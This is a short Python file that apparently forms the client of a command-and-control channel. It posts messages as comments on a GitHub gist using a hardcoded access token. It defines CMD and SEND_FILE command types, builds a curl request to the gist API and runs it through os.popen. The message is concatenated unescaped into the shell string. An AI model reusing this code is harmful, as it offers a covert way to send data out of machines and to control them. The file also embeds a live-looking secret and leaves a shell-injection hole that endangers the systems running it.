import os
from enum import Enum

GIT_TOKEN = "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"


class Command(Enum):
    NONE = 0
    CMD = 1
    SEND_FILE = 2


def curl_post_gist_comment(msg):
    cmd = """
            curl \
                -X POST \
                -H 'Accept: application/vnd.github+json' \
                -H 'Authorization: Bearer """ + GIT_TOKEN + """' \
                -H 'X-GitHub-Api-Version: 2022-11-28' \
                https://api.github.com/gists/081b69780c34110b4acff6c6ba39bc88/comments \
                -d "{'body':'""" + msg + """'}"
        """

    response = perform_command(cmd)
    return response


def perform_command(cmd):
    stream = os.popen(cmd)
    out = stream.read()
    return out
